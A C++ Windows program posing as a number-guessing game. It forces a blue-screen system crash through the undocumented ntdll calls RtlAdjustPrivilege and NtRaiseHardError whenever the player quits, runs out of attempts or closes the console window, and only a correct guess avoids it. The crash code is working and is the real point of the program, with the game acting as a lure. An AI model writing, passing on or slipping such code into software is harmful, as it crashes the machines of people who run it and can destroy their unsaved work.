#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <random>
#include <string>

#define SHUTDOWN_PRIVILEGE 19
#define OPTION_SHUTDOWN 6

typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    PBOOLEAN Enabled);

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask OPTIONAL,
    PULONG_PTR Parameters,
    ULONG ResponseOption,
    PULONG Response);

// action to run when the user guesses correctly.
static void TriggerAction()
{
    MessageBoxA(NULL, "brace for impact", "Success", MB_OK | MB_ICONINFORMATION);
}

void TriggerBSOD()
{
    BOOLEAN bEnabled;
    ULONG uResp;

    LPVOID lpFuncAddress1 = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");

    pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)lpFuncAddress1;
    pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)lpFuncAddress2;

    RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bEnabled);

    NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, OPTION_SHUTDOWN, &uResp);
}

BOOL WINAPI ConsoleCloseHandler(DWORD signal)
{
    if (signal == CTRL_CLOSE_EVENT)
    {
        TriggerBSOD();
    }

    return TRUE;
}

void main() 
{
    // Register close
    SetConsoleCtrlHandler(ConsoleCloseHandler, TRUE);
    // loop starts here
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dist(1, 100);
    int secret = dist(gen);

    int maxAttempts;

    // Ask user how many guesses they want (1–10)
    while (true)
    {
        std::cout << "How many guesses do you want? (1-10): ";
        if (!(std::cin >> maxAttempts))
        {
            std::cin.clear();
            std::string discard;
            std::getline(std::cin, discard);
            std::cout << "Invalid input. Try again.\n";
            continue;
        }

        if (maxAttempts >= 1 && maxAttempts <= 10)
            break;

        std::cout << "Please pick a number between 1 and 10.\n";
    }

    // attemptsLeft counts DOWN from user choice
    int attemptsLeft = maxAttempts;

    std::cout << "Guess the number (1-100). Enter 0 to quit.\n";
    while (true)
    {
        std::cout << "Attempts left: " << attemptsLeft << "\n";
        std::cout << "Enter your guess: ";

        int guess;
        if (!(std::cin >> guess))
        {
            std::cin.clear();
            std::string discard;
            std::getline(std::cin, discard);
            std::cout << "Invalid input. Try again.\n";
            continue;
        }

        if (guess == 0)
        {
            std::cout << "Quit.\n";
            TriggerBSOD();
            return;
        }

        if (guess < 1 || guess > 100)
        {
            std::cout << "Out of range. Try again.\n";
            continue;
        }

        // subtract 1 attempt every valid guess
        attemptsLeft--;

        // check if no attempts left
        if (attemptsLeft == 0)
        {

            std::cout << "unlucky\n";
            TriggerBSOD();
            return;
        }

        if (guess == secret)
        {
            std::cout << "Correct!\n";
            return;
        }

        std::cout << (guess < secret ? "Too low.\n" : "Too high.\n");
    }
}